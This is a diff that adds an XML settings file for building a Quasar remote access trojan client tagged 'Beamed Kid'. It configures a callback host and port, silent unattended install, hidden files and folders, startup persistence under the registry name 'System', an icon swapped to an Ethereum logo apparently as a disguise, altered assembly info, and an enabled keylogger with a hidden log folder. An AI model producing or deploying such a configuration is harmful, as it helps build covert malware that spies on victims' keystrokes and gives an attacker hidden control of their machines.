@@ -1,0 +1,33 @@
+<settings>
+  <Tag>Beamed Kid</Tag>
+  <Hosts>192.168.56.1:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>7596ffa8-81d2-4d4c-91ce-4a1fac3d8ad2</Mutex>
+  <UnattendedMode>True</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>Quasar</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>System</RegistryName>
+  <ChangeIcon>True</ChangeIcon>
+  <IconPath>C:\Users\baile\Downloads\Ethereum_logo_2014.svg.ico</IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>Quasar</ProductName>
+  <Description>RAT builder</Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>1.4.1.1</ProductVersion>
+  <FileVersion>1.4.1.1</FileVersion>
+</settings>
